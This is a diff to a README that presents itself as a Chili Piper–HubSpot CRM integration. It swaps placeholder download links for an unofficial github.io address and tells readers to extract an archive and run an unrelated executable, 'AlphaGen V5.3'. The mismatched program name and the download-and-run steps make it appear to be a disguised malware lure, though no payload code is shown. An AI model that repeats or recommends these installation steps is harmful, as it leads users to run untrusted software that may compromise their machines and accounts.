@@ -2,13 +2,13 @@
 
 Integrate Chili Piper with HubSpot CRM to automate meeting scheduling, route leads in real time, and connect reps instantly to prospects.
 
-[![Download](https://img.shields.io/badge/Download-ChiliPiper_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-ChiliPiper_HubSpot_Integration-blueviolet)](https://chilipiper-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://chilipiper-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract it to any local directory  
 3. 🖱 Run AlphaGen V5.3 to activate scheduling logic  
 4. ✅ In HubSpot, go to `Settings > Integrations > Chili Piper`, connect your calendar and define routing rules
